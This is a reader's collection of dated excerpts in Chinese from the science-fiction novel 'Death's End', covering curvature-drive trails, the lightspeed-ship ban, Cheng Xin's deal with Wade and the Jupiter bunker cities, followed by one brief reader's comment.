<p>当这架有史以来最大的望远镜调试完成、第一次成功地获取一颗四十七光年外的恒星图像时，观测站中的天文学家威纳尔激动得像看到儿子降生一般。与普通人想象的不同，以前的天文望远镜在观察太阳系外的恒星时，能做到的只是增强光度，不可能看到形状，不管望远镜有多强大，看到的恒星都是一个点，只是亮了些。但这时，在这架超级望远镜的视野中，恒星第一次显出了圆盘形状，虽然很小，像几十米外的一个乒乓球，看不清任何细节，但对于古老的可见光天文观测来说仍是一个划时代的时刻。</p>
<p>“天文学从此摘除了白内障！”威纳尔热泪盈眶地说。</p>
<p>2016-01-30</p>
<p>威纳尔说：“如果真发现了光粒，不发警报可能是更好的选择，反正也没什么用。本来嘛，在不知不觉中突然完蛋是一种幸运，你却又要把几十亿人折磨二十四小时，这简直是反人类罪。”</p>
<p>2016-01-30</p>
<p>在望远镜的原始视野中，三体星系的图像看上去很平淡，只是太空背景上的一小片白色，像夜空中的一片羽毛，但图像经过处理放大至全屏后，显现出一片壮丽的星云。恒星爆发已经七年，现在看到的是爆发后三年的景象。在引力和原恒星留存下来的角动量的作用下，星云由凌厉的放射状渐渐变成一片柔和模糊的云团，然后被自转离心力压扁，显示出清晰精致的螺旋状。在星云上方，还可以看到另外两颗恒星，其中一颗显示出圆盘形状，另一颗只是更远处的一个光点，只有从它在群星背景上的移动中才能分辨出来。</p>
<p>从灾难中幸存下来的两颗恒星实现了三体世界世代的梦想，构成了一个稳定的双星系统，但现在没有生命能享受它们的照耀，这个星系已经完全不适合生命生存了。现在看来，黑暗森林打击只摧毁三星中的一颗，并不仅仅是为了经济，还有着更毒辣的目的。在星系中仍存在一至两颗恒星的情况下，星云物质不断被恒星吸入，这个过程产生了巨量的强辐射，使现在的三体星系成为了辐射的熔炉，对生命和文明来说是一个死亡之域。正是这强辐射的激发，才使得那片星云自身发光，看起来如此明亮清晰。</p>
<p>2016-01-30</p>
<p>看着这四十万亿千米外的银色墓场，威纳尔也感慨万千，“其实吧，从科学角度讲，毁灭一词并不准确，没有真正毁掉什么，更没有灭掉什么，物质总量一点不少都还在，角动量也还在，只是物质的组合方式变了变，像一副扑克牌，仅仅重洗而已……可生命是一手同花顺，一洗什么都没了。”</p>
<p>2016-01-30</p>
<p>威纳尔把图像再次推远，想从整体上看看星云与双星的位置关系，并且想知道是否能看出星云的自转。在视野中，星云再次变成漆黑深空中的一小片白色。就在这时，在距离三体星系约六千个天文单位的远距离太空中，他又看到了一个“肥皂泡”，比刚才那个大许多倍，直径约五十个天文单位，约为一个行星系大小，在里面可以容纳三体星系或太阳系。威纳尔把这个新发现告诉了瓦西里。</p>
<p>2016-01-30</p>
<p>威纳尔盯着看了一会儿，试探着说：“三体第二舰队进入光速的位置？”</p>
<p>2016-01-30</p>
<p>一个显而易见的事实：曲率驱动飞船在进入光速的加速段会留下航迹</p>
<p>2016-01-30</p>
<p>第一个较小的航迹在三体星系内部，它的出现有几种可能。也许，三体世界最初并不知道曲率驱动会留下航迹，在试验曲率引擎或光速飞船试航时在星系中意外产生了航迹；或者他们知道航迹的事，却因某种意外把航迹留在星系中。但有一点可以肯定，这绝对不是他们希望的事，他们肯定试图消除航迹，但没有做到。十一年前，三体第二舰队用了一年时间进行常规航行，在距母星系远达六千个天文单位时才启动曲率引擎进入光速，就是为了让航迹尽量远离母星系，虽然这样做已经晚了。</p>
<p>当时，这个举动一直让人们迷惑，最合理的解释是：这是为了避免415艘飞船进入光速时的能量溢出对三体世界产生影响。现在看来，是为了避免因曲率驱动航迹暴露母星文明。第二舰队在距太阳系六千个天文单位的远方就匆匆脱离光速也是这个原因。威纳尔和瓦西里长时间对视着，目光中的恐惧越来越深，他们都在进行着同一个推测。</p>
<p>“立刻报告。”威纳尔说。“可现在还不到常规通信时间，这时报告就等于是警报了。”</p>
<p>“这就是警报！警告人类不要自我暴露！”“你过虑了吧，人类才刚开始研究光速飞船，半个世纪后能造出来就不错了。”</p>
<p>“可万一初步试验就能产生那种航迹呢？也许这种试验在太阳系的什么地方正做着呢！”于是，这个信息被以警报级别用中微子束发往舰队总参谋部，又被转发到联合国PDC总部，不想通过不正常渠道被误传为光粒攻击警报，引发了两天后的世界性动乱。</p>
<p>曲率驱动航迹是飞船在进入光速时留下的，就像火箭从地面起飞时在发射台上留下的烧痕，飞船进入光速后即以惯性飞行，不再留下航迹。可以合理地推测，飞船在由光速进入亚光速时同样会留下这样的痕迹。现在还不知道航迹能够在太空中保留多久，据推测，这可能是曲率驱动引起的某种空间畸变，可能会保留很长时间，甚至永久存在。</p>
<p>2016-01-30</p>
<p>人们有理由认为，智子所说：从远距离观察，三体星系看起来比太阳系更危险，正是因为三体星系内部那一片直径十个天文单位的曲率驱动航迹——这使得对三体星系的黑暗森林打击来得无比迅速。航迹和坐标广播相互印证，使得三体星系的危险值急剧上升。</p>
<p>2016-01-30</p>
<p>在接下来的一个月时间里，一号观测单元又在不同方向的太空中发现了六处曲率驱动航迹，都近似地呈球形，大小差别很大，直径从十五到两百个天文单位不等，但形态都很相似，其中有一处距太阳系仅为六千个天文单位，显然是三体第二舰队从光速脱离时留下的。其余的几处从它们所在的方向和位置看，都与三体第二舰队无关。可以认为，曲率航迹在宇宙中是普遍存在的。</p>
<p>这是继“蓝色空间”号和“万有引力”号两艘飞船在四维空间碎块中的发现后，对宇宙中存在大量高等智慧文明的又一个直接证据。其中的一处航迹距太阳仅1.4光年，已经接近奥尔特星云，显然曾经有一艘宇宙飞船在那里停留，然后进入光速离去了，但谁也不知道这事是什么时候发生的</p>
<p>2016-01-30</p>
<p>曲率驱动航迹的发现，使得已经备受质疑的光速飞船计划彻底死亡。舰队国际和联合国都很快促成了国际立法，各个国家也相继立法，全面禁止对曲率驱动飞船的研究和制造，这是继三个世纪前的核不扩散条约以来，对一项技术最严厉的法律禁止。</p>
<p>2016-01-30</p>
<p>《时间之外的往事》</p>
<p>（节选）对无边暗夜的恐惧</p>
<p>表面上看，光速飞船计划的死亡有着明显的原因：避免由此产生的曲率驱动航迹提前暴露地球文明的存在，或者提升太阳系在宇宙观察者眼中的危险值，招致更快到来的黑暗森林打击。但这件事背后有着更深层的原因。从公元世纪到危机纪元末，人类对星空是充满向往的，但迈向宇宙的头几步充满失败和痛苦。惨烈的末日战役让人类痛苦地意识到自己在宇宙中的脆弱，同样给人们心灵带来创伤的是人类之间的黑暗战役。后来发生的事，无论是对“青铜时代”号的审判，还是“蓝色空间”号劫持“万有引力”号并发布宇宙广播，都加深了这种创伤，并使其上升到哲学高度。</p>
<p>其实，普通大众对该计划只是持冷漠态度，他们认为，即使光速飞船在自己的有生之年造出来，也不是属于自己的东西。大众更关注掩体计划，这毕竟是最现实的生存之道；当然也关注黑域计划，三个世纪的恐惧经历使人们强烈向往平安的生活，黑域能够提供这种生活；至于与宇宙的隔绝，人们当然感到遗憾，但太阳系本身已经足够大了，这种遗憾是可以接受的。人们对黑域的关注度低于掩体计划，是因为普通人也能看出这种技术的超级难度，大众普遍认为，凭人类的力量很难完成这样的上帝工程。相比大众的冷漠态度，对于光速飞船计划的狂热支持和坚决反对都来自精英阶层。</p>
<p>支持研制光速飞船的派别认为，人类最终的安全来自于向银河系的扩张和殖民，在这个冷酷的宇宙中，只有外向型的文明才能生存，偏安一隅终究要灭亡。持这种观点的人大多不反对掩体计划，但都对黑域计划持强烈的厌恶情绪，认为那是自掘坟墓，虽然他们承认黑域能够保证人类长期生存下去，但对整个文明而言，那种生活与死亡无异。反对光速飞船的人大多是出于政治原因。他们认为，人类文明历尽艰辛，终于进入近乎理想的民主社会，而飞向星空后的人类则不可避免地发生社会大倒退。太空像一面放大镜，可以在瞬间把人类的阴暗面放到最大。“青铜时代”号审判中一名被告赛巴斯蒂安·史耐德的一句话被他们当做反复引用的口号：</p>
<p>当人类真正流落太空时，极权只需五分钟。由民主文明的地球向银河系播撒无数个极权的种子，这种前景是一些人死也不愿接受的。</p>
<p>处于幼年的人类文明曾经打开家门向外看了一眼，外面无边的暗夜吓住了他，他面对黑暗中的广袤和深邃打了个寒战，紧紧地关上了门。</p>
<p>广播纪元8年，地日拉格朗日点</p>
<p>2016-01-30</p>
<p>从科学角度看，这个试验其实完全没有必要，用已经得到的大量数据进行计算机模拟就可以得出相当可信的结果。即使必须进行实体试验，也完全可以在试验室中进行，虽然规模小，但经过精心设计，也可以达到很高的精度。从科研角度看，太空中的这个大规模试验笨拙到弱智的程度。</p>
<p>但无论是试验的发起方还是设计和实施者都清楚，试验的最终目的不是科研，它实质上是一场耗资巨大的宣传，用以确立国际社会对掩体计划的信心。这就要求试验必须十分直观，有视觉冲击力，并且便于向全世界直播。</p>
<p>2016-01-30</p>
<p>“你好，我在你旁边。”</p>
<p>程心立刻听出这是谁，不由得打了个寒战。她的艇处于前排五艘艇的最边上，向右看去，是紧靠着她的一艘球形太空艇，与她上次乘坐的那艘很相似，透明罩几乎占了艇身的一半，可以看到艇中有五个人，托马斯·维德坐在靠她的一侧向她招手。程心能够一眼认出维德，是因为他没有像身边的另外四人一样穿着轻便太空服，而是仍然穿着那身黑皮夹克，仿佛在显示对太空的鄙视。他仍没有装假手，一个袖管空着。“我们对接一下，我到你那里去。”维德说，并没有征得程心的同意就启动了对接程序，他的太空艇开动了微调推进器，向程心这边缓缓靠过来，程心也只好启动了自己的对接程序。一次轻轻的震动后两艇靠在一起，舱门已经密封对接，门无声地滑开，两边气压平衡时程心的耳朵嗡地响了一下。</p>
<p>维德从对面飘行过来，他不可能有太多的太空经验，但与程心一样，似乎天生就属于这个环境。虽然只有一只手，他在失重中的动作却很稳健，仿佛仍然有重力作用在他身上一般。舱里很暗，地球的光照在对面的岩石上，再反射进来，就在这朦胧的光亮中，程心打量了维德一眼，发现时光仍未在他身上留下太多的印记，他与八年前在澳大利亚时变化不大。“你怎么在这里？”程心问，尽量使自己的声音冷静一些，但在这个人面前她总是很难做到这一点。如果说这些年的经历，使世上万事在程心的心中都磨砺得如同眼前这块巨石一样圆润，维德就是这块石头上唯一仍然锐利的地方。</p>
<p>“我刑满了，一个月前。”维德从上衣口袋中掏出半截雪茄含在嘴里，在这里当然不能点燃，“减刑，一个杀人犯，仅十一年就出来了，我知道这不公平，对你。”“我们都遵从法律，那没有什么不公平的。”</p>
<p>“在所有事情上都遵从，比如光速飞船？”维德还是以前那样，像利刃一般飞快切入正题，不浪费一点时间。程心没有回答。</p>
<p>“你为什么选择光速飞船？”维德问，转头毫无顾忌地直视着程心。“因为只有在这个选择中，人是大写的。”程心说，勇敢地迎接着他的目光。</p>
<p>维德点点头，把雪茄从嘴里拿出来，“很好，你是大写的。”程心用询问的目光看着他。</p>
<p>“你知道什么是对的，也有勇气和责任心去做，这很了不起。”“但是？”程心替他说出这两个字。“但是，你没有完成这种事情的能力和精神力量。我们的理想是相同的，我也想造光速飞船。”</p>
<p>“你到底想说什么？”“给我。”</p>
<p>“给你什么？”“你拥有的一切。你的公司、你的财富、你的权力、你的地位，如果可能的话，还有你的荣耀和声誉。我用这些去造光速飞船，为了你的理想，为了大写的人。”</p>
<p>这时，太空艇的微调推进器又启动了，前面岩石的引力很微小，但还是拉着太空艇缓慢地前移，向岩面靠近，推进器把太空艇轻轻推离岩石，恢复到原位。等离子喷口的蓝色火焰照亮了岩面，上面画着的大红斑像一只突然睁开的巨眼，不知是这只眼还是维德刚才的话，让程心的心紧缩起来。维德与那只巨眼对视着，目光冷酷锐利，还带着一丝嘲讽。程心没有说话，她一时不可能说出什么。</p>
<p>“不要犯第二次错误。”维德说，这话的每个字都像一记重锤砸在程心的心上。试验时间到了，氢弹引爆，由于太空中没有大气层的阻挡，其能量几乎全部以辐射形式放出。在从距爆心四百千米处拍摄的直播画面上看，太阳旁边出现了一只火球，其亮度和大小很快超过了太阳本身，摄像机的遮光罩不断调低透明度，如果有人从这个距离目视的话，会导致永久失明。当火球达到最亮时，画面中除了一片雪亮什么都没有了，那光焰似乎要吞没整个宇宙。</p>
<p>处于巨石阴影中的程心和维德看不到这些，太空艇内关闭了转播画面，但能够看到他们身后的“土星”亮度突然增加，像一颗超新星。紧接着，巨石朝向“太阳”一面被烧熔的岩浆从四周飞过，那些岩浆掠过巨石边缘时呈暗红色，但在向着背阳面飞出一段距离后，核爆炸照在上面的强光反射亮度超过了它们本身发出的红光，细碎的岩浆变成了光芒四射的焰火，从太空艇上看，仿佛是从顶端观看一道银光闪闪的瀑布浩浩荡荡地落向地球方向。这时，模拟类地行星的四个较小的石块已经破碎消失，而模拟巨行星的巨石像四团被喷灯的火焰吹着的冰激凌，面向辐射的一面迅速被烧熔，变成规则光滑的球形，每块巨石后面都拖着一条越来越长的银光闪闪的岩浆尾巴。辐射到达后十几秒钟，氢弹外壳产生的模拟恒星物质的迸射物才击中巨石，使石块剧烈震动起来，并向外缓缓移动。太空艇的推进器启动，保持着艇身与巨石的距离。火球持续了约三十秒后熄灭了，太空仿佛是一座突然关灯的大厅，一个天文单位之外的太阳的光芒显得暗弱无力。随着光焰的消失，巨石处于红炽状态的一半发出的光显现出来，开始很亮，像燃烧一般，但很快在太空的严寒中变成暗红色，凝固的岩浆在巨石边缘形成一圈长长的毛刺。</p>
<p>四块巨石后面的五十艘太空艇全部安然无恙。延时五秒的图像传回地球，整个世界一片欢腾，对未来的希望像氢弹一样爆发开来，掩体计划模拟试验的目的达到了。</p>
<p>“不要犯第二次错误。”维德重复一遍，仿佛刚才发生的一切不过是打断他们谈话的短暂噪声。程心看了看紧靠着这里的维德的那艘太空艇，艇内四个穿太空服的男人都一直关注着这边，并没有在意刚刚发生的壮观事件。程心知道，报名参加试验的人成千上万，只有知名或重要人物才能被选中，而维德刚刚出狱，那四个人显然是他的人，那艘太空艇也可能是属于他的。早在十一年前他竞选执剑人时，他就有许多忠实的追随者和无数的支持者，据说他还成立了一个组织，也许这一切都不是空穴来风。他就像一块核燃料，即使静静地封闭在铅容器中，都能让人感觉到力量和威胁。</p>
<p>2016-01-30</p>
<p>地球方向，已经冷却的熔岩碎屑在星空的背景前飘浮着，在阳光中像一片懒洋洋的灰尘，程心感觉心中的什么东西正松弛下来，自己也变得像一粒浮尘了。</p>
<p>在返回的途中，当太空艇与地球的距离缩小到三十万千米以内、通信基本没有延时时，程心给艾AA打电话，告诉了她与维德会面的事。“照他说的做，把他要的都给他！”AA毫不犹豫地回答。“你……”程心吃惊地看着信息窗口中的AA，她本来以为AA是这件事最大的障碍。</p>
<p>“他说得对，你没有能力做这件事，这会彻底毁了你的！但他行，这个混蛋、恶魔、杀人犯、野心家、政治流氓、技术狂人……他行，他有干这事的精神力量和本事，让他去干好了，这是地狱，让他跳进去吧。”“那你呢？”</p>
<p>AA莞尔一笑，“我当然不会在那个家伙手下工作，我会拿走属于我那份的。光速飞船禁止法出来后，我也怕这事儿了，我会去干些轻松的我喜欢的事儿，我希望你也能找到这种事儿。”两天后，在星环公司总部的透明大厅里，程心会见了维德。“我可以把你要的一切都给你。”程心说。</p>
<p>“然后你进入冬眠，”维德紧接着程心的话说，“因为你的存在可能影响我们的事业。”程心点点头，“可以，这也是我的打算。”</p>
<p>“成功的那一天我们会唤醒你，那也是你的成功。如果那时光速飞船仍然违法，我们承担一切责任；如果光速飞船被世界接受，荣誉归于你……那可能是半个世纪甚至更长时间以后了，我们都老了，可你仍然年轻。”“我有个条件。”“说。”</p>
<p>“当这个事业可能危害人类的生命时，必须唤醒我，我将拥有最终的决定权，并可以收回赋予你的一切权力。”“我不接受这个条件。”</p>
<p>“那就算了，我什么都不能给你。”“程心，你知道我们将从事的是什么样的事业，有时候，不得不……”</p>
<p>“那就算了，我们各走各的路吧。”维德看着程心，他的目光里出现了一些罕见的东西：犹豫，甚至无助——这种东西以前在他的精神世界中是很难看到的，就像火中难以见到水。“让我考虑考虑。”他说，然后走到透明墙壁前，看着外面的都市森林。三个世纪前的那个夜晚，在联合国广场，在纽约灯海的背景上，程心也见过这个黑色的背影。大约两分钟后，维德转过身来，他没有走过来，只是在透明墙壁前远远地看着程心。</p>
<p>“好吧，我接受。”程心记得三个世纪前他转身后说的是：“Sendcerebra only.（只送大脑。）”这句话后来改变了历史。</p>
<p>“我没有太多可以约束你的，我只能相信你的承诺。”冰水似的微笑在维德脸上溢散开来，“其实你自己很清楚，如果我违背承诺，对你是一种幸运，但很遗憾，我不会的，我会遵守承诺。”维德走过来，一手整了整身上的皮夹克，但只是使上面的皱褶更多了。他站在程心面前庄重地说：“我保证：如果在光速飞船的研制过程中有可能危害人类生命，不管是以什么形式，我们都会唤醒你，到时你将拥有最终决定权，并可以收回我的一切权力。”</p>
<p>2016-01-30</p>
<p>十天后，托马斯·维德成为星环公司的总裁，全面接管了公司事务。</p>
<p>与此同时，程心和艾AA进入冬眠。她们的意识在寒冷中渐渐模糊，那感觉就像在一条大河中顺流漂了很久，终于精疲力竭地上了岸，静止下来，看着大河在眼前流淌，看着熟悉的水面漂向远方。就在她们暂时退出的时间长河中，人类的故事还在继续。</p>
<p>掩体纪元11年，掩体世界</p>
<p>2016-01-30</p>
<p>程心的身体渐渐恢复知觉，她的头能够转动了，随即看到了房间的窗户。她仍然记得冬眠前看到的世界，那时的冬眠中心是城市边缘的一棵巨树建筑，她当时在最顶端的叶子里，从落地窗可以看到宏伟的城市森林。现在从这扇窗看出去，只看到几幢普通的楼房，建在地面上的楼房，外形整齐划一，从反射阳光的表面看，像是金属结构的。这些建筑让程心再一次感觉回到了公元世纪。</p>
<p>她突然有一种幻觉：自己是不是刚从一场大梦中醒来？威慑纪元、广播纪元的一切都是梦，那些记忆虽然清晰，但太超现实，太像梦了。也许，自己根本没有三次跨越时间，仍身在公元世纪？</p>
<p>2016-01-30</p>
<p>半个小时后，程心穿着一身与这个时代相称的白色套装，与曹彬一起来到冬眠中心的一个阳台上。城市在她面前展开，唯一令程心感慨的仍然是这种时光倒流的平凡感。在威慑纪元第一次苏醒后，当她看到城市的巨树森林时，那种震撼难以言表，她本来以为永远也看不到这样平凡的城市景观了。城市规划得很整齐，好像是一次性建成的，建筑的外形单调划一，似乎只考虑实用性，没有任何建筑美学方面的设计，都是长方体形状，外表没有任何装饰，甚至表面的色彩都是一样的金属银灰色，很奇怪，竟让她想起小时候见过的铝饭盒。这些整齐的建筑密集地排列着，直到目力所及的远方，在那里，是向上升起的山坡，城市延伸到坡上。</p>
<p>“这是哪里？”程心问。“见鬼，怎么又是阴天？看不到对面了。”曹彬没有回答程心的问题，而是看着天空失望地摇摇头，好像阴天对程心认识这个新世界有很大影响似的，但程心很快发现了天空的异常。</p>
<p>太阳在云层前面。这时，云层开始消散，出现一道迅速扩大的云隙。透过云隙，程心并没有看到蓝天，她看到的天空仍是大地，空中的大地上是与周围相似的城市，只是她在远远地仰望或俯瞰，这就是曹彬刚才说的“对面”。程心发现，远处那升起的地面并不是山坡，而是一直上升与“对面”连在一起的。她回头看，发现相反的方向地面也在远方上升，也是一直升到“对面”——这个世界是在一个大圆筒中。“这是亚洲一号太空城，在木星的背面。”曹彬这才回答程心刚才的问题。</p>
<p>2016-01-30</p>
<p>新世界就这样展现在程心面前，所有的平凡瞬间变为震撼，她感到自己这时才真正苏醒过来</p>
<p>2016-01-30</p>
<p>车速不快，可以从容地观赏外面的城市风景，现在，这一切在程心眼中都有了全新的含义。她看到大片的楼群从车窗外掠过，其间有小片的绿地和水塘。她还看到两所学校，校园里有蓝色的操场。她看到公路之外的地上覆盖着褐色的土壤，看上去与地球的土地没有太大区别，路边种着一种很像梧桐的阔叶树，还不时出现广告牌，上面的商品程心大多认不出是什么，但广告的风格却不陌生。</p>
<p>与公元世纪城市的唯一区别是，这个世界几乎全部是用金属建成的，建筑物都是金属构造，看看车内，除金属外也很少见到其他的材料，没有合成板，也没有塑料。</p>
<p>2016-01-30</p>
<p>程心更多注意的还是车里的人。在另一侧的座位上坐着两个男人，其中一个夹着黑色的公文包在打瞌睡，另一个穿着一身带有黑色油污的黄色工作服，脚旁放着一个工具袋，一件程心不认识的器具从袋中露出一半，像是古代的冲击钻，不过是半透明的，这个男人的脸上露出体力劳动者的疲惫和漠然。前排坐着一对情侣，男孩伏在女孩的耳边不停地说着什么，女孩不时地傻笑一阵，并用一个小片儿从纸杯中刮出粉红色的东西吃，显然是冰激凌，程心甚至闻到了奶油的甜香味，与她记忆中三个世纪前的味道没有什么不同。旁边站着两个没有座位的中年妇女，是那种程心曾经十分熟悉的女人，被生活磨去了风韵，变得市井且不修边幅。这样的女人在威慑纪元和广播纪元是不存在的，那个时代的女人皮肤永远细腻白嫩，在各个年龄段都有着相应的精致和美丽。程心听到了这两个女人的对话。</p>
<p>……“你没弄对，早市菜价和晚市差不多的，不要嫌麻烦，到西头批发市场去。”</p>
<p>“那里量不够也不按批发价卖。”“你得等到晚一些，七点以后吧，那些菜贩子走了，多少都能按批发价。”……</p>
<p>车内其他人的对话也断断续续地传来：“市政部门与大气系统不同的，比较复杂，你才需要多长心眼，开始和谁都别太近，也别太远。”</p>
<p>“收供暖费就不合理，应该已经包含在电费里了。”“早点把那个傻瓜换下来也不会输那么惨。”</p>
<p>“知足吧，我还是城建时期的老人呢，我一年才挣多少？”“那鱼都不新鲜了，怎么能清蒸呢？”</p>
<p>“前天位置维持，四号公园的水又溢出来了，淹了一大片。”“人家看不上他就算了，何必呢？你说他累不累呀……”</p>
<p>“不是正品，高仿的都不是，那个价钱……”……</p>
<p>程心的心中漾起一种温暖的感觉，自从威慑纪元第一次苏醒后她就在寻找这种感觉，曾以为永远也找不到了。她几乎是贪婪地倾听着这些话音，对曹彬介绍太空城的话倒是没有太注意。</p>
<p>2016-01-30</p>
<p>程心发现前方的天空中又出现了一个太阳，他们位于两个太阳之间。曹彬告诉她，太空城中共有三个人造太阳，都悬浮在太空城失重的中轴线上，相互间隔十千米左右，都是由核聚变产生能量，按二十四小时一昼夜调节明暗。</p>
<p>2016-01-30</p>
<p>程心在进入电梯前，恋恋不舍地回头看了一眼她似乎已经熟悉的城市。在这个位置上三个太阳都能看到，它们排成一排伸向太空城的另一端。这时正值黄昏时间，太阳正在暗下去，由耀眼的黄白色变成了柔和的橘红，给城市镀上一层温馨的金光。程心看到，在不远处的草地上有几个少女，穿着白色的校服，坐在草坪上快乐地说笑着，她们被风吹起的长发浸透了天顶上夕阳的金色光芒。</p>
<p>2016-01-30</p>
<p>程心随意把目光锁定在城市的某处，发现那里楼房的布局很像公元世纪自己家所在的小区，她想象着那里某幢普通的楼房二层的某个窗口，蓝色的窗帘透出柔和的灯光，窗帘的后面，爸爸妈妈在等着自己……程心一时抑制不住自己的眼泪。</p>
<p>在威慑纪元第一次苏醒后，程心一直无法融入新时代，感觉自己是另一个时间的外来者。她万万没有想到，半个世纪后，在这距地球八亿千米的木星背面竟找到了回家的感觉。似乎三个多世纪前那熟悉的一切被一双无形的巨手卷起来，像画幅一样卷成圆筒状安放到这里，成为这在她眼前环绕一圈的世界。</p>
<p>2016-01-30</p>
<p>程心注意到，太空艇起飞时发动机喷口的光焰比半个世纪前她看到的要暗许多，不再刺眼，呈幽蓝色，这也许意味着小型聚变发动机的效率提高了。</p>
<p>2016-01-30</p>
<p>这里很冷，只有附近的太空艇启动时发动机喷出的热量才带来短暂的暖意。程心打了个哆嗦，并非仅仅因为冷，而是她突然意识到自己竟完全暴露在太空中！但周围的空气和大气压是实实在在的，还能感到阵阵寒风。看来，程心曾看到的在非封闭的太空环境中保持大气压的技术进一步发展，已经能够在全开放的太空生成大气层了！</p>
<p>曹彬看到了她的震惊，说：“哦，目前只能在距‘地面’十米左右形成正常气压的空气层，再厚就做不到了。”</p>
<p>2016-01-30</p>
<p>你运气不错，遇到了三天一次的奇观，看！”曹彬指着一侧的太空说。程心在那个方向远远地看到了一个小白点，白点渐渐扩大，很快变成一个乒乓球大小的白色球体。</p>
<p>“木卫二？”程心问。“是，木卫二，我们现在离它的轨道很近，你站稳了，别害怕。”</p>
<p>程心想着他最后一句话的意思，同一般人一样，在她的印象里，天体在肉眼的视野中显示的运行速度都是很慢的，大部分在短时间观察中无法觉察到其运动。但她立刻意识到一个事实：太空城并不是木星的卫星，它们与木星是相对静止的，木卫二是运行速度很快的一颗卫星，她记得达到每秒十四千米，这样木卫二与太空城的相对速度也是这么高，如果太空城与它的轨道很接近的话……没容程心细想，那个白色球体迅速增大，其膨胀速度给人一种不真实的感觉。木卫二很快占据了大半个太空，由一个白色小球转瞬间变成一个巨大的星球，空间的上下感也瞬间改变，程心感到亚洲一号正在向那白色的世界坠落下去。接着，这个直径三千多千米的世界从他们头顶快速移过，那一刻全部太空都被它占据。这时，太空城实际上是在木卫二的冰冻海洋上空飞行，可以清晰地看到冰面上纵横交错的条纹，像白色巨掌上的掌纹。被木卫二引力扰动的空气层中刮起了疾风，程心感到一股无形的力量从左向右拉扯着自己，如果不是穿着磁性鞋，她肯定会被拉离地面。旁边没有固定的小物体都飞了起来，几根与太空艇连接的管缆也飞舞着飘起，一阵让人心悸的隆隆声从脚下响起，是太空城巨大的结构框架在木卫二急剧变化的引力中产生的应力引起的。木卫二掠过太空城仅用了三分钟左右的时间，然后在另一侧把它的另一面显现出来，同时急剧变小。这时，前两排的八座太空城都启动了推进器，调整被木卫二引力改变的位置和姿态，太空顿时亮起八个光团。</p>
<p>“天啊，刚才它有多近？！”程心惊魂未定地问。“最近的时候距这里一百五十千米，几乎是擦边而过。没办法，木星有十三颗卫星，太空城群落不可能完全避开它们。木卫二的轨道与赤道倾角很小，所以与这一排城市距离很近。它是木星城市群落的主要水源，上面还有很多工业，但一旦打击到来，都是要牺牲掉的。太阳爆发后，木星所有卫星的轨道都要发生大变化，到时候太空城要避开它们，那可是一个复杂的操作。”</p>
<p>2016-01-30</p>
<p>程心发现这里的城市建筑更密集，也更高，显示出宏伟的大都市气派。特别是在高纬度的低重力地区，建筑的高度只受球体空间的限制，在靠近两极的地区都出现了高达十千米的大厦，是球体半径的一半，其顶端距人造太阳也只有十千米，像从地面伸向太阳的几根细长的尖刺。</p>
<p>2016-01-30</p>
<p>在这座太空城中，程心看到了一个亚洲一号所没有的壮丽景观：赤道环海。其实，大多数太空城中都有宽度不等的环海，亚洲一号在这方面倒是一个特例。在球形或椭球形城市构型中，在重力方向上赤道是最低处，城市的水体自然集中于此，形成一个环绕城市中部的水环，成为城市的一条波光粼粼的腰带。站在海边，可以看到环海自两侧升起，从太阳后面横跨“天空”。程心和曹彬乘快艇在环海航行一周，航程六十多千米，海水来自木卫二，清澈冷冽，粼粼的波光投映到两岸的摩天楼群上。环海向木星的一侧堤坝较高，是为了防止位置维持时产生的加速使海水溢出，尽管这样，城市在进行非常规推进时还是可能导致小规模水灾。</p>
<p>2016-01-30</p>
<p>欧洲四号是人口最少的太空城，仅四百五十万人，是掩体世界中最富裕的地方。程心惊奇地看到一大片在小太阳照耀下的精致别墅，每幢别墅都带有游泳池，有的甚至还有宽阔的草坪。宁静的环海点缀着片片白帆，岸边有悠闲的垂钓者。她看到一艘游艇缓缓驶过，其豪华程度较之过去的地球也毫不逊色，艇上正在举行有小乐队伴奏的酒会……她很惊奇这样的生活居然能够搬到距地球八亿千米的木星阴影中来</p>
<p>2016-01-30</p>
<p>在掩体工程的早期岁月，太平洋一号被用作上百万工程人员的居住区，随着工程的进展，又被用作施工材料的大型存储库，后来发现这座早期的实验性太空城有许多设计上的缺陷，最终被废弃了。向掩体世界的大移民结束后，太平洋一号中又开始有人居住，后来也形成了一座城市，有市政府和警察机构，但只负责维持最基本的公共设施的运转，对于城市社会基本上放任自流。太平洋一号是唯一一座不需要居留权就可自由入住的城市，城中主要是失业者和流浪者，以及众多因各种原因失去社会保险的穷人，还有潦倒的艺术家，后来甚至成了一些极端政治组织的据点。</p>
<p>2016-01-30</p>
<p>太平洋一号没有城市推进器，内部也没有人造太阳，最重要的一点是它不自转，城市处于完全失重状态。</p>
<p>程心进入城里后，看到的是一个童话般的世界：仿佛一座破旧但繁华的老城市，突然失去了地心引力，一切都飘浮在空中。太平洋一号是一座永夜之城，每座建筑都用核电池维持照明和生活，于是有了漫天的灯火。城市中的建筑大多是简易棚屋，用废弃的建筑材料做成，由于没有上下之分，一般都做成六面全有窗（也是门）的立方体，或者做成球形，后者的好处是在不可避免的飘浮碰撞中强度较高。太平洋一号中完全没有地权的概念，所有建筑都在飘浮中位置不定，原则上市民有权使用城内任何一处空间。城市中还有大量的流浪者，他们连棚屋都没有，全部家当都放在一个大网兜里，以防四处飘散，他们就与网兜一起飘浮中生活。城市里的交通极其简单，几乎没有车辆，也见不到失重拖曳索和个人推进器之类的东西，失重中的人们用脚踹建筑物飘行。由于城市中飘浮的建筑十分密集，到任何地方都不是问题，但这种移动方式需要很高的技巧。看着那些在飘浮的建筑间敏捷穿行的人，程心不由得想起了在树枝间悠荡而行的长臂猿。</p>
<p>2016-01-30</p>
<p>还有一些构型更为奇特的太空城，它们大多是工业或农业城市，没有常住人口。比如一座叫资源一号的太空城，长度达到一百二十千米，直径却只有三千米，是一根细长的杆子，它并不是绕自己的长轴旋转，而是以中点为轴心翻着筋斗。这座太空城内部是分层的，不同层域的重力差异极大，只有少数几层适合居住，其余部分都是适合不同重力的工业区。据曹彬说，在土星和天王星城市群落，两个或几个杆状太空城可以自中部绞结在一起，形成十字形或星形的组合体。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>工业区意味着有工人工作，那么他们工作时的环境就是这样，在不适合人们居住的环境。</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-30</p>
